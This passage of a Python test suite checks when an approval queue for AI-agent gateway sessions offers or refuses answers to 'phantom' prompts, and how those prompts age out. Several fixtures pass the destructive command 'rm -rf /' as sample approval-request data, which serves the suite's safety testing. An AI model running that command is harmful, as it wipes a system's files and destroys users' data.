    assert orphan.session_id == "sess-focus", (
        "the fixture must leave the driven copy keyed by the aged runtime id"
    )
    assert not orphan.observed_request_id, "the fixture must reach the keyless state"

    # The blind phantom is refused, with the phantom's own sentence — the one
    # promising only the unconditional age-out (the round-eight split).
    assert orphan.answerable is False, (
        "a blind phantom was offered beside its polled copy: "
        f"{(orphan.session_id, orphan.blocked_reason)}"
    )
    assert orphan.blocked_reason == PHANTOM_APPROVAL_AGES_OUT
    # The id-carrying polled copy of the same approval stays offered: aimed by
    # id (tools/approval.py:2655-2658), it cannot land on any other entry.
    polled = next(i for i in approvals if i.source == SOURCE_APPROVAL_POLL)
    assert polled.observed_request_id == "gw-7", (
        "the fixture must give the polled copy the gateway's own id"
    )
    assert polled.answerable is True, (
        "an id-carrying approval was folded beside a phantom: "
        f"{polled.blocked_reason!r}"
    )

    # Settling the polled copy does not resurrect the offer: the latch means
    # the gateway may still hold that entry, and it may be the phantom's own
    # session — the shadowed half of the fold's session accounting.
    fleet = settle_queue_item(
        fleet, profile=PROFILE, session_id="dur-1", request_key="gw-7",
        at=BASE_TIME + 50,
    )
    survivors = [
        i
        for i in fleet_queue(fleet).items
        if i.kind == "approval" and i.source != SOURCE_ROSTER
    ]
    assert [i.request_key for i in survivors] == [orphan.request_key], (
        "the fixture must latch the polled copy, leaving only the phantom visible"
    )
    assert survivors[0].answerable is False, (
        "a settled sibling resurrected the phantom's offer"
    )
    assert survivors[0].blocked_reason == PHANTOM_APPROVAL_AGES_OUT, (
        "the shadowed-session leg lost the phantom's own sentence: "
        f"{survivors[0].blocked_reason!r}"
    )


def test_an_id_carrying_anchored_sibling_stays_answerable_beside_a_phantom() -> None:
    """The fold spares a driven approval the anchor recovery did re-derive.

    Both prompts here are the focused session's; the second carries a gateway id
    so the poll re-anchors it to the durable row, while the first — keyless —
    stays under the aged runtime id. That is one gateway session accounted as
    two. The keyless phantom stays refused with its own sentence: answering it
    would be a blind pop at a FIFO whose head may be a different command. The
    anchored sibling's answer carries ``gw-8``, and an answer carrying a
    gateway id is aimed: ``resolve_gateway_approval``
    (``tools/approval.py:2655-2658``) selects by id and returns 0 on no match,
    head-pop unreachable, so it cannot land on the phantom's entry — offered.

    Updated on the round-seven ruling (2026-08-18) from asserting both refused
    (the phantom-present over-refusal boundary this test pinned since
    2026-08-17). Not a weakening: for the aimed half the refused failure mode
    cannot occur at the cited gateway code, and the blind half keeps its own
    pin in ``test_a_blind_sibling_session_stays_refused_beside_a_phantom``.
    """
    fleet = focused_fleet()
    fleet = route_frame(
        fleet,
        decoded(
            raw_event("approval.request", {"command": "rm -rf /"}),
            at=BASE_TIME + 10,
            seq=20,
        ),
        profile=PROFILE,
    )
    fleet = route_frame(
        fleet,
        decoded(
            raw_event("approval.request", {"request_id": "gw-8", "command": "ship it"}),
            at=BASE_TIME + 11,
            seq=21,
        ),
        profile=PROFILE,
    )
    fleet = apply_active_list(
        fleet,
        active_list({"id": "sess-focus", "session_key": "dur-1", "status": "waiting"}),
        profile=PROFILE,
        at=BASE_TIME + 12,
        poll_epoch=1,
    )
    for index in range(MAX_RUNTIME_ALIASES + 1):
        fleet = apply_active_list(
            fleet,
            active_list({"id": f"rt-{index}", "session_key": "dur-1", "status": "waiting"}),
            profile=PROFILE,
            at=BASE_TIME + 13 + index,
            poll_epoch=2 + index,
        )
    assert ("default", "sess-focus") not in fleet.aliases, "the alias must have aged out"
    fleet = apply_approval_pending(
        fleet,
        decode_pending_approvals(
            {"approvals": [{"request_id": "gw-8", "command": "ship it"}]},
            at=BASE_TIME + 40,
        ),
        profile=PROFILE,
        session_id="dur-1",
        at=BASE_TIME + 40,
    )

    approvals = [
        i
        for i in fleet_queue(fleet).items
        if i.kind == "approval" and i.source != SOURCE_ROSTER
    ]
    assert {i.session_id for i in approvals} == {"sess-focus", "dur-1"}, (
        "the fixture must account one gateway session as two: "
        f"{[(i.session_id, i.request_key) for i in approvals]}"
    )
    anchored = next(i for i in approvals if i.session_id == "dur-1")
    assert anchored.observed_request_id == "gw-8", (
        "the fixture must re-anchor the keyed prompt to its durable row"
    )

    assert anchored.answerable is True, (
        "an aimed answer was refused beside a phantom: "
        f"{anchored.blocked_reason!r}"
    )
    phantom = next(i for i in approvals if i.session_id == "sess-focus")
    assert phantom.answerable is False, (
        "a blind phantom was offered beside its anchored sibling"
    )
    assert phantom.blocked_reason == PHANTOM_APPROVAL_AGES_OUT, (
        f"the phantom lost its own sentence: {phantom.blocked_reason!r}"
    )


def _phantom_beside_sibling_session_fleet() -> FleetState:
    """CR6 round six's finding-1 fleet, from ``.saga/u6-deadlock-repro.py``.

    One connection, two gateway sessions. ``dur-1`` holds a keyless driven
    approval whose runtime alias (``sess-focus``) has been trimmed out of the
    four-slot window — a phantom. ``dur-2`` holds exactly one polled approval,
    ``gw-9``, WITH a gateway request id: the sole entry in its own session's
    gateway queue.
    """
    fleet = focused_fleet()
    fleet = route_frame(
        fleet,
        decoded(
            raw_event("approval.request", {"command": "rm -rf /"}),
            at=BASE_TIME + 10,
            seq=20,
        ),
        profile=PROFILE,
    )
    fleet = apply_active_list(
        fleet,
        active_list({"id": "sess-focus", "session_key": "dur-1", "status": "waiting"}),
        profile=PROFILE,
        at=BASE_TIME + 11,
        poll_epoch=1,
    )
    for index in range(MAX_RUNTIME_ALIASES + 1):
        fleet = apply_active_list(
            fleet,
            active_list({"id": f"rt-{index}", "session_key": "dur-1", "status": "waiting"}),
            profile=PROFILE,
            at=BASE_TIME + 12 + index,
            poll_epoch=2 + index,
        )
    assert ("default", "sess-focus") not in fleet.aliases, "the alias must have aged out"
    fleet = apply_active_list(
        fleet,
        active_list(
            {"id": "rt-9", "session_key": "dur-1", "status": "waiting"},
            row("dur-2", "waiting", title="second session"),
        ),
        profile=PROFILE,
        at=BASE_TIME + 30,
        poll_epoch=20,
    )
    return apply_approval_pending(
        fleet,
        decode_pending_approvals(
            {"approvals": [{"request_id": "gw-9", "command": "ls -la"}]},
            at=BASE_TIME + 40,
        ),
        profile=PROFILE,
        session_id="dur-2",
        at=BASE_TIME + 40,
    )


def test_an_id_carrying_sibling_session_stays_answerable_beside_a_phantom() -> None:
    """The cross-session leg of the fold, narrowed to what its premise covers.

    ``dur-2`` holds nothing but ``gw-9``, with the gateway's own request id.
    The fold used to refuse it too, on the premise that the phantom in
    ``dur-1`` may belong to any session on the connection — including
    ``dur-2``, ahead of ``gw-9`` — so an answer for ``gw-9`` could land on
    the phantom's entry. That premise holds only for a blind answer:
    ``resolve_gateway_approval`` (``tools/approval.py:2655-2658``) selects
    ``targets`` by id on its ``if request_id:`` arm and returns 0 on no
    match, with the head-pop (``queue.pop(0)``) the ``else`` of an
    if/elif/else — structurally unreachable while an id is present — and
    ``approval.respond`` (``tui_gateway/methods_prompt.py``) passes
    ``request_id`` through verbatim, never retrying without one. So even if
    the phantom sits ahead of ``gw-9`` in one FIFO, the aimed answer resolves
    ``gw-9`` and nothing else, and a stale id is a no-op, not a blind pop.

    Updated on the round-seven ruling (2026-08-18) from asserting both items
    refused — this is the deliberate update of the over-refusal boundary from
    a shape where the sibling was folded to one where it is answerable beside
    a live phantom. Not a weakening: the refusal's failure mode cannot occur
    for an aimed answer at the cited gateway code, and the blind case keeps
    its refusal in ``test_a_blind_sibling_session_stays_refused_beside_a_phantom``.

    The phantom itself stays refused, with its own truthful sentence — the
    per-session predecessor sentence stays banned (round six). The sentence
    now promises the age-out, which the round-eight split made unconditional;
    round seven's version of this paragraph banned that promise because the
    age-out was focus-scoped then and off-focus never fired.
    """
    fleet = _phantom_beside_sibling_session_fleet()

    approvals = [
        i
        for i in fleet_queue(fleet).items
        if i.kind == "approval" and i.source != SOURCE_ROSTER
    ]
    assert {i.session_id for i in approvals} == {"sess-focus", "dur-2"}, (
        "the fixture must hold the phantom and the sibling session's approval: "
        f"{[(i.session_id, i.request_key) for i in approvals]}"
    )
    sibling = next(i for i in approvals if i.session_id == "dur-2")
    assert sibling.observed_request_id == "gw-9", (
        "the fixture must give the sibling a gateway id — the provably-lone shape"
    )

    # The narrowed rule: aimed by id, the sibling stays offered.
    assert sibling.answerable is True, (
        "an id-carrying sibling session was folded beside a phantom: "
        f"{sibling.blocked_reason!r}"
    )
    # The phantom keeps a refusal, and never the per-session predecessor
    # sentence — no approval is queued ahead of it in its own accounting.
    phantom = next(i for i in approvals if i.session_id == "sess-focus")
    assert phantom.answerable is False, (
        "the blind phantom itself was offered beside a sibling session"
    )
    assert phantom.blocked_reason != QUEUED_BEHIND_APPROVAL
    assert phantom.blocked_reason == PHANTOM_APPROVAL_AGES_OUT, (
        f"the phantom lost its own sentence: {phantom.blocked_reason!r}"
    )


def _phantom_beside_blind_sibling_fleet() -> FleetState:
    """One connection, two sessions, and not a gateway id anywhere.

    ``dur-1`` holds a keyless driven approval whose runtime alias
    (``sess-focus``) the four-slot window trimmed — a phantom. ``dur-2``
    (runtime ``sess-2``, alias alive, focused) holds a keyless **driven**
    approval — the one blind shape that exists, since every polled row carries
    a gateway id (:class:`PolledApproval` drops keyless rows). Focus moves to
    ``sess-2`` before its approval arrives because the reducer ignores
    non-focused sessions' events, and prompts survive the switch by design.
    """
    fleet = focused_fleet()
    fleet = route_frame(
        fleet,
        decoded(
            raw_event("approval.request", {"command": "rm -rf /"}),
            at=BASE_TIME + 10,
            seq=20,
        ),
        profile=PROFILE,
    )
    fleet = apply_active_list(
        fleet,
        active_list(
            {"id": "sess-focus", "session_key": "dur-1", "status": "waiting"},
            {"id": "sess-2", "session_key": "dur-2", "status": "waiting"},
        ),
        profile=PROFILE,
        at=BASE_TIME + 11,
        poll_epoch=1,
    )
    fleet = replace(fleet, focused=focus_session(fleet.focused, "sess-2"))
    fleet = route_frame(
        fleet,
        decoded(
            raw_event("approval.request", {"command": "make deploy"}, session_id="sess-2"),
            at=BASE_TIME + 12,
            seq=21,
        ),
        profile=PROFILE,
    )
    for index in range(MAX_RUNTIME_ALIASES + 1):
        fleet = apply_active_list(
            fleet,
            active_list(
                {"id": f"rt-{index}", "session_key": "dur-1", "status": "waiting"},
                {"id": "sess-2", "session_key": "dur-2", "status": "waiting"},
            ),
            profile=PROFILE,
            at=BASE_TIME + 13 + index,
            poll_epoch=2 + index,
        )
    assert ("default", "sess-focus") not in fleet.aliases, "the alias must have aged out"
    return fleet


def test_a_blind_sibling_session_stays_refused_beside_a_phantom() -> None:
    """The un-narrowed half of the round-seven ruling: blind answers stay refused.

    ``dur-2``'s approval is driven and keyless — Talaria holds no gateway
    request id for it — so its answer would be a bare ``approval.respond``:
    the head-pop arm of ``resolve_gateway_approval``, landing on whatever
    entry heads the session's one FIFO. While the phantom stands, that entry
    may be the phantom's — the gateway keeps **one** approval queue per
    session and the phantom's real session may be any on this connection,
    ``dur-2`` included. So the blind sibling stays refused, with the
    connection fold's own sentence, whose clearing clause now promises only
    what the registry delivers: resolution from the phantom's own session's
    view, with no unconditional expiry.
    """
    fleet = _phantom_beside_blind_sibling_fleet()

    approvals = [
        i
        for i in fleet_queue(fleet).items
        if i.kind == "approval" and i.source != SOURCE_ROSTER
    ]
    assert {i.session_id for i in approvals} == {"sess-focus", "dur-2"}, (
        "the fixture must hold the phantom and the blind sibling: "
        f"{[(i.session_id, i.request_key) for i in approvals]}"
    )
    sibling = next(i for i in approvals if i.session_id == "dur-2")
    assert not sibling.observed_request_id, (
        "the fixture must leave the sibling blind — no gateway id anywhere"
    )

    assert sibling.answerable is False, (
        "a blind answer was offered while a phantom could head its queue"
    )
    assert sibling.blocked_reason == UNPLACEABLE_APPROVAL_ON_CONNECTION, (
        f"the blind refusal lost the fold's own sentence: {sibling.blocked_reason!r}"
    )
    phantom = next(i for i in approvals if i.session_id == "sess-focus")
    assert phantom.answerable is False
    assert phantom.blocked_reason == PHANTOM_APPROVAL_AGES_OUT
    # Both sentences now promise the expiry, because since the round-eight
    # split it is delivered unconditionally — round seven's ban on the
    # "ages out unanswered" clause protected against a focus-scoped age-out
    # that no longer exists. Neither sentence may route the exit through
    # focusing the phantom's session, which round eight showed is impossible.
    assert "ages out" in sibling.blocked_reason
    assert "ages out" in phantom.blocked_reason
    assert "focus the session" not in sibling.blocked_reason
    assert "focus the session" not in phantom.blocked_reason


# ── The fold must not over-refuse: provably-head shapes stay offered ──────
#
# CR6 round six, finding 1, part two: the over-refusal question answered with
# fleets rather than prose. Each test below builds a shape where an approval
# has a provable head — or sits beyond the fold's stated reach — and asserts
# the offer stands. Together with the lone-phantom carve-out already pinned in
# ``test_a_phantom_blocks_itself_but_not_its_id_carrying_polled_copy`` (a
# phantom alone on its connection keeps the lone-approval offer), these are
# the shapes tried: another connection entirely, a phantom-free multi-session
# connection, and the fold's one real exit — the phantom aging out, focused
# or not, since the round-eight split made the removal unconditional.


def test_a_phantom_on_one_connection_folds_nothing_on_another() -> None:
    """An approval on another connection stays offered beside a phantom.

    The phantom's session key names no row, so the session it belongs to may be
    any session *on its connection* — the frames arrived on that connection's
    socket, which is the one fact still standing. A lone anchored approval on a
    different connection shares no gateway queue with it and is provably the
    head of its own; refusing it would be over-refusal with no safety behind it.

    Scope honesty (post round-seven narrowing, 2026-08-18): this pins the
    OFFER, no longer the fold's per-connection keying. The approval it builds
    carries a gateway id, and the narrowed fold exempts id-carrying approvals
    under either keying — so it passes with fleet-wide phantom keying too,
    though it killed that mutant in round six, before the exemption existed.
    The keying's equivalence under mutation, and why it is kept anyway, is
    recorded at the ``phantoms_by_profile`` lookup in
    ``_with_head_of_queue_rules``.
    """
    fleet = _phantom_beside_sibling_session_fleet()
    fleet = probed(fleet, OTHER)
    fleet = apply_active_list(
        fleet,
        active_list(row("other-sess", "waiting", title="other connection")),
        profile=OTHER,
        at=BASE_TIME + 50,
        poll_epoch=1,
    )
    fleet = apply_approval_pending(
        fleet,
        decode_pending_approvals(
            {"approvals": [{"request_id": "gw-other", "command": "make test"}]},
            at=BASE_TIME + 51,
        ),
        profile=OTHER,
        session_id="other-sess",
        at=BASE_TIME + 51,
    )

    other = [i for i in fleet_queue(fleet).items if i.profile == OTHER and i.kind == "approval"]
    assert [i.request_key for i in other] == ["gw-other"], (
        "the fixture must hold one anchored approval on the other connection"
    )
    assert other[0].answerable is True, (
        "a phantom on one connection folded an approval on another: "
        f"{other[0].blocked_reason!r}"
    )


def test_two_sessions_without_a_phantom_keep_their_own_heads() -> None:
    """Multi-session alone does not fold — only a phantom widens the accounting.

    Two gateway sessions, each holding exactly one polled approval with its own
    gateway id, every alias alive. Each is the provable head of its own queue,
    and the head-of-queue rule is per session: both stay offered.
    """
    fleet = focused_fleet()
    fleet = apply_active_list(
        fleet,
        active_list(
            row("dur-1", "waiting", title="first"),
            row("dur-2", "waiting", title="second"),
        ),
        profile=PROFILE,
        at=BASE_TIME + 10,
        poll_epoch=1,
    )
    for session, request_id in (("dur-1", "gw-1"), ("dur-2", "gw-2")):
        fleet = apply_approval_pending(
            fleet,
            decode_pending_approvals(
                {"approvals": [{"request_id": request_id, "command": "ls"}]},
                at=BASE_TIME + 20,
            ),
            profile=PROFILE,
            session_id=session,
            at=BASE_TIME + 20,
        )

    approvals = [i for i in fleet_queue(fleet).items if i.kind == "approval"]
    assert {i.request_key for i in approvals} == {"gw-1", "gw-2"}, (
        "the fixture must hold one anchored approval per session"
    )
    assert [i.answerable for i in approvals] == [True, True], (
        "a phantom-free multi-session connection lost a provable head: "
        f"{[(i.session_id, i.blocked_reason) for i in approvals]}"
    )


def test_the_fold_ends_when_the_phantom_ages_out() -> None:
    """The fold is exactly as wide as the phantom's registry presence.

    Walked end to end under the round-eight split: no refocus is needed —
    round eight established a trimmed-runtime-id session can never be
    focused again, so the round-seven shape of this test (focus the
    phantom's session, age it there) demonstrated an exit no operator could
    take. :func:`age_out_approvals` now withdraws the phantom at
    :data:`APPROVAL_STALE_AFTER` from wherever focus happens to be, the same
    tick the UI runs on every render (``app.py``'s ``_age_out_approvals``).
    The moment the phantom leaves the registry, ``dur-2``'s blind approval
    is a lone approval in its own session again and the offer returns.
    Blocked forever would be over-refusal; this pins that the block ends
    when its cause does — at most one stale window after the phantom's
    approval arrived.
    """
    fleet = _phantom_beside_blind_sibling_fleet()
    sibling = next(
        i
        for i in fleet_queue(fleet).items
        if i.kind == "approval" and i.session_id == "dur-2"
    )
    assert sibling.answerable is False, "the fixture must start folded"
    assert sibling.blocked_reason == UNPLACEABLE_APPROVAL_ON_CONNECTION, (
        f"the blind refusal must carry the fold's own sentence: {sibling.blocked_reason!r}"
    )

    # The exit, from right where the operator is: focus stays on ``sess-2``
    # and the phantom ages out anyway. Only the phantom is past the
    # threshold; sess-2's own blind approval arrived two seconds later and
    # survives this horizon.
    fleet = replace(
        fleet,
        focused=age_out_approvals(fleet.focused, now=BASE_TIME + 10 + APPROVAL_STALE_AFTER),
    )
    assert [p.session_id for p in fleet.focused.prompts] == ["sess-2"], (
        "age-out must take exactly the phantom, focused or not: "
        f"{[(p.request_id, p.session_id) for p in fleet.focused.prompts]}"
    )

    approvals = [
        i
        for i in fleet_queue(fleet).items
        if i.kind == "approval" and i.source != SOURCE_ROSTER
    ]
    assert [i.session_id for i in approvals] == ["dur-2"], (
        "the fixture must age the phantom out of the registry: "
        f"{[(i.session_id, i.request_key) for i in approvals]}"
    )
    assert approvals[0].answerable is True, (
        "the fold outlived the phantom that caused it: "
        f"{approvals[0].blocked_reason!r}"
    )


def test_a_trimmed_id_phantom_off_focus_ages_out_at_threshold() -> None:
    """The round-eight ruling, on round seven's own fixture: the leak closes.

    Round seven pinned that a phantom off focus never ages out (the A3 guard)
    and never renders a card — which round eight ruled is the leak, because a
    session whose runtime id was trimmed can never be focused again, so the
    deferral was permanent. The REMOVAL is now unconditional at
    :data:`APPROVAL_STALE_AFTER`: one second short of the threshold the
    phantom stands, at the threshold it is gone. The PRESENTATION effects
    keep their focus scoping — ``dur-2`` is focused here, so the withdrawal
    is silent: no counter increment and no transcript line, because both have
    nowhere to go but the focused session, which this approval is not from.
    The withdrawal's notice is the queue's own: the item is derived from the
    prompt, so removing the prompt withdraws the item from the fleet queue —
    the owning row's surface — and :func:`prompt_view` renders no card for it
    before or after, unchanged."""
    fleet = _phantom_beside_sibling_session_fleet()
    fleet = replace(fleet, focused=focus_session(fleet.focused, "dur-2"))
    before = fleet.focused
    assert [p.request_id for p in before.prompts] == ["approval:sess-focus#1"], (
        "the fixture must hold exactly the phantom's prompt"
    )
    assert prompt_view(before).rows == (), (
        "no card may render for the phantom while its session is unfocused"
    )

    # One second short of the threshold: nothing happens, so the boundary
    # itself is under test rather than assumed.
    threshold = BASE_TIME + 10 + APPROVAL_STALE_AFTER
    assert age_out_approvals(before, now=threshold - 1.0) is before

    aged = age_out_approvals(before, now=threshold)
    assert aged.prompts == (), (
        "the off-focus phantom must age out at the threshold: "
        f"{[(p.request_id, p.session_id) for p in aged.prompts]}"
    )
    assert "approval:sess-focus#1" in aged.flushed_prompt_ids, (
        "the withdrawal must be latched so a late restore cannot resurrect it"
    )
    # Presentation stays focus-scoped: silent where no surface exists.
    assert aged.withdrawn_approvals == before.withdrawn_approvals, (
        "a foreign withdrawal must not increment the focused session's counter"
    )
    assert aged.transcript == before.transcript, (
        "a foreign withdrawal must not write into the focused session's transcript"
    )

    # The queue item's withdrawal is the notice: the phantom's item is gone
    # from the fleet queue, and the sibling stands alone and answerable.
    fleet = replace(fleet, focused=aged)
    approvals = [
        i
        for i in fleet_queue(fleet).items
        if i.kind == "approval" and i.source != SOURCE_ROSTER
    ]
    assert [i.session_id for i in approvals] == ["dur-2"], (
        "the phantom's derived item must leave the queue with its prompt: "
        f"{[(i.session_id, i.request_key) for i in approvals]}"
    )
    assert approvals[0].answerable is True, (
        f"the sibling must stay answerable once the phantom is gone: "
        f"{approvals[0].blocked_reason!r}"
    )
    assert prompt_view(fleet.focused).rows == (), (
        "the age-out must not conjure a card for the departed phantom"
    )


def test_twelve_switch_away_cycles_age_out_to_zero_at_threshold() -> None:
    """The round-eight quantification probe, inverted into a regression fixture.

    Twelve ordinary land-approve-switch-away cycles against ONE durable row,
    exactly as the driver's ``quantify.py`` built them. Before the split that
    probe measured 11 of 12 prompts surviving age-out at 1000x
    :data:`APPROVAL_STALE_AFTER` — every non-focused session's approval had
    no clearing path at all. With removal unconditional, one stale window
    after the last arrival there are ZERO survivors, every id is latched,
    and the queue derives no approval item from any of them. The bound the
    pinning decision rests on: what a runtime-alias pin would have to hold
    is what arrives inside one stale window, not the life of the row."""
    fleet = focused_fleet()
    cycles = 12
    for n in range(cycles):
        runtime_id = f"rt-{n}"
        fleet = apply_active_list(
            fleet,
            active_list({"id": runtime_id, "session_key": "dur-1", "status": "waiting"}),
            profile=PROFILE,
            at=BASE_TIME + n * 10,
            poll_epoch=n + 1,
        )
        fleet = replace(
            fleet, focused=replace(fleet.focused, focused_session_id=runtime_id)
        )
        fleet = route_frame(
            fleet,
            decoded(
                raw_event(
                    "approval.request",
                    {"request_id": f"gw-{n}", "command": "rm -rf /"},
                    session_id=runtime_id,
                ),
                at=BASE_TIME + n * 10 + 1,
                seq=100 + n,
            ),
            profile=PROFILE,
        )
    assert len(fleet.focused.prompts) == cycles, (
        "the fixture must reproduce the probe's pile-up before it inverts it"
    )

    horizon = BASE_TIME + (cycles - 1) * 10 + 1 + APPROVAL_STALE_AFTER
    aged = age_out_approvals(fleet.focused, now=horizon)
    assert aged.prompts == (), (
        "one stale window after the last arrival, zero survivors: "
        f"{[(p.request_id, p.session_id) for p in aged.prompts]}"
    )
    assert {f"gw-{n}" for n in range(cycles)} <= aged.flushed_prompt_ids, (
        "every withdrawn approval must be latched against a late restore"
    )
    # Presentation stays focus-scoped: rt-11 is focused, so exactly its
    # withdrawal is counted and written; the other eleven go silently.
    assert aged.withdrawn_approvals == 1, (
        "only the focused session's withdrawal may be counted"
    )
    assert len([e for e in aged.transcript if e.kind == "prompt-expired"]) == 1, (
        "only the focused session's withdrawal may write a transcript line"
    )

    fleet = replace(fleet, focused=aged)
    leftover = [
        i
        for i in fleet_queue(fleet).items
        if i.kind == "approval" and i.source != SOURCE_ROSTER
    ]
    assert leftover == [], (
        "no approval item may survive its prompt: "
        f"{[(i.session_id, i.request_key) for i in leftover]}"
    )


def test_age_out_takes_the_phantom_with_the_live_approval() -> None:
    """Round seven's other probe (``probe4.py``), inverted by the round-eight split.

    ``dur-1``'s runtime id churns past the four-slot window while a driven
    approval (``gw-A``) is outstanding, and the operator re-lands the same
    gateway session under its current id ``rt-4``. A fresh approval
    (``gw-NEW``) arrives there. Three facts, each its own leg:

    * The fresh id-carrying approval is answerable beside the phantom — the
      narrowed fold — and the registry agrees: :func:`respond_to_prompt`
      allows it, so the queue never offers what the registry refuses.
    * The phantom stays refused **although it carries a gateway id of its
      own**: an answer for it can only be sent under its dead runtime id, and
      the gateway resolves the session before any queue is touched
      (``_sess_nowait``, ``tui_gateway/server.py:2507-2509`` — an exact
      lookup, ``session not found`` on a miss), so its aim never gets to
      matter. The id exemption is for siblings whose session names a live
      row, never for the phantom itself.
    * Age-out takes them BOTH — the round-eight split made the removal
      unconditional, where round seven's probe measured the focus-scoped
      age-out sparing the phantom forever. The presentation stays with the
      focused session alone: one counted withdrawal and one transcript line,
      ``gw-NEW``'s, while the phantom goes silently — its notice is its
      derived queue item leaving the fleet queue.
    """
    fleet = focused_fleet()
    fleet = route_frame(
        fleet,
        decoded(
            raw_event("approval.request", {"request_id": "gw-A", "command": "rm -rf /"}),
            at=BASE_TIME + 10,
            seq=20,
        ),
        profile=PROFILE,
    )
    fleet = apply_active_list(
        fleet,
        active_list({"id": "sess-focus", "session_key": "dur-1", "status": "waiting"}),
        profile=PROFILE,
        at=BASE_TIME + 11,
        poll_epoch=1,
    )
    for index in range(MAX_RUNTIME_ALIASES + 1):
        fleet = apply_active_list(
            fleet,
            active_list({"id": f"rt-{index}", "session_key": "dur-1", "status": "waiting"}),
            profile=PROFILE,
            at=BASE_TIME + 20 + index,
            poll_epoch=2 + index,
        )
    assert ("default", "sess-focus") not in fleet.aliases, "the alias must have aged out"
    fleet = replace(fleet, focused=focus_session(fleet.focused, "rt-4"))
    fleet = route_frame(
        fleet,
        decoded(
            raw_event(
                "approval.request",
                {"request_id": "gw-NEW", "command": "ls"},
                session_id="rt-4",
            ),
            at=BASE_TIME + 40,
            seq=40,
        ),
        profile=PROFILE,
    )

    approvals = [
        i
        for i in fleet_queue(fleet).items
        if i.kind == "approval" and i.source != SOURCE_ROSTER
    ]
    assert {i.request_key for i in approvals} == {"gw-A", "gw-NEW"}, (
        f"the fixture must hold the phantom and the fresh approval: {approvals}"
    )
    fresh = next(i for i in approvals if i.request_key == "gw-NEW")
    assert fresh.answerable is True, (
        f"the fresh id-carrying approval was folded beside the phantom: "
        f"{fresh.blocked_reason!r}"
    )
    _, refusal = respond_to_prompt(fleet.focused, "gw-NEW", session_id="rt-4")
    assert refusal is None, (
        f"the registry refused an answer the queue offers: {refusal!r}"
    )
    phantom = next(i for i in approvals if i.request_key == "gw-A")
    assert phantom.observed_request_id == "gw-A", (
        "the fixture must give the phantom itself a gateway id"
    )
    assert phantom.answerable is False, (
        "an id on the phantom itself must not reopen the fold: its session "
        "resolution fails before its aim can matter"
    )
    assert phantom.blocked_reason == PHANTOM_APPROVAL_AGES_OUT

    before = fleet.focused
    fleet = replace(
        fleet,
        focused=age_out_approvals(
            fleet.focused, now=BASE_TIME + 10 + APPROVAL_STALE_AFTER * 100
        ),
    )
    assert fleet.focused.prompts == (), (
        "age-out must take the phantom with the live focused approval: "
        f"{[(p.request_id, p.session_id) for p in fleet.focused.prompts]}"
    )
    assert {"gw-A", "gw-NEW"} <= fleet.focused.flushed_prompt_ids, (
        "both withdrawals must be latched against a late restore"
    )
    # Presentation stays focus-scoped: the live approval on the focused
    # session is counted and written; the phantom's withdrawal is silent.
    assert fleet.focused.withdrawn_approvals == before.withdrawn_approvals + 1, (
        "only the focused session's withdrawal may be counted"
    )
    notes = [
        e
        for e in fleet.focused.transcript
        if e.kind == "prompt-expired" and e not in before.transcript
    ]
    assert len(notes) == 1 and "ls" in notes[0].text and "rm -rf /" not in notes[0].text, (
        "the one new transcript line must be the focused session's, not the phantom's"
    )
    leftover = [
        i
        for i in fleet_queue(fleet).items
        if i.kind == "approval" and i.source != SOURCE_ROSTER
    ]
    assert leftover == [], (
        "the phantom's derived item must leave the queue with its prompt: "
        f"{[(i.session_id, i.request_key) for i in leftover]}"
    )


def test_a_settled_feed_a_item_does_not_cover_the_roster_wait() -> None:
    """A hidden item must not stand in for the gateway's word that a session waits.

    Coverage drops the roster item because a visible feed-A prompt says the same
    thing with more detail. A prompt hidden by AE2's settled latch says nothing
    at all — before 2026-08-17 it still covered, so a session the gateway
    reported ``waiting`` rendered as no item anywhere, the one answer the module
    docstring forbids. Re-showing the roster wait restores nothing the latch
    withheld: the latch withholds the settled item's control, and a roster item
    is never answerable.
    """
    fleet = focused_fleet()
    fleet = route_frame(
        fleet,
        decoded(
            raw_event("clarify.request", {"request_id": "c-9", "question": "which?"}),
            at=BASE_TIME + 10,
            seq=20,
        ),
        profile=PROFILE,
    )
    fleet = apply_active_list(
        fleet,
        active_list(row("sess-focus", "waiting")),
        profile=PROFILE,
        at=BASE_TIME + 11,
        poll_epoch=1,
    )
    before = fleet_queue(fleet).items
    assert [i.source for i in before] == [SOURCE_DRIVEN], (
        "the fixture must reach the covered state: one visible driven item, "
        f"no roster item — got {[(i.source, i.request_key) for i in before]}"
    )

    fleet = settle_queue_item(
        fleet, profile=PROFILE, session_id="sess-focus", request_key="c-9",
        at=BASE_TIME + 20,
    )
    assert (PROFILE, "sess-focus", "c-9") in fleet.settled_items, (
        "the fixture must latch the covering item for the danger to be reachable"
    )

    queue = fleet_queue(fleet)
    assert queue.items, "the waiting session vanished from the queue entirely"
    roster = [i for i in queue.items if i.source == SOURCE_ROSTER]
    assert [i.session_id for i in roster] == ["sess-focus"], (
        f"the roster wait must come back once nothing visible covers it: {queue.items}"
    )
    assert roster[0].answerable is False
    # The latch itself holds: the settled item's control is not restored.
    assert all(i.request_key != "c-9" for i in queue.items), (
        "re-showing the roster wait must not restore the settled item"
    )
    assert summary_line(queue, BASE_TIME + 21) != NEEDS_YOU_NONE


def test_a_settled_roster_wait_is_not_a_permanent_tombstone() -> None:
    """One settled status word must not silence every later wait on its session.

    ``ROSTER_REQUEST_KEY`` is a module constant — per session, but one key for
    every wait a session ever has — so before 2026-08-17 a single settled roster
    item was a tombstone naming every future roster wait there: the session
    could block on a person a week later and the queue would say none for the
    life of the run. A roster item carries no control, so there is nothing for
    a latch to withhold, and the queue ignores the tombstone outright.
    """
    fleet = foreign_waiting_fleet()
    first = fleet_queue(fleet).items
    assert [i.source for i in first] == [SOURCE_ROSTER], (
        f"the fixture must start with exactly the roster wait: {first}"
    )

    fleet = settle_queue_item(
        fleet,
        profile=PROFILE,
        session_id="sess-bg",
        request_key=first[0].request_key,
        at=BASE_TIME + 7,
    )
    assert (PROFILE, "sess-bg", ROSTER_REQUEST_KEY) in fleet.settled_items, (
        "the fixture must mint the tombstone for the danger to be reachable"
    )
    # Inert immediately: a status word has no control a latch could withhold.
    assert [i.source for i in fleet_queue(fleet).items] == [SOURCE_ROSTER]

    # The wait ends, and later a genuinely new wait begins on the same session.
    fleet = apply_active_list(
        fleet,
        active_list(row("sess-bg", "working", title="background work")),
        profile=PROFILE,
        at=BASE_TIME + 20,
        poll_epoch=2,
    )
    assert fleet_queue(fleet).items == (), (
        "the fixture must pass through a non-waiting poll between the two waits"
    )
    fleet = apply_active_list(
        fleet,
        active_list(row("sess-bg", "waiting", title="background work")),
        profile=PROFILE,
        at=BASE_TIME + 30,
        poll_epoch=3,
    )

    later = fleet_queue(fleet).items
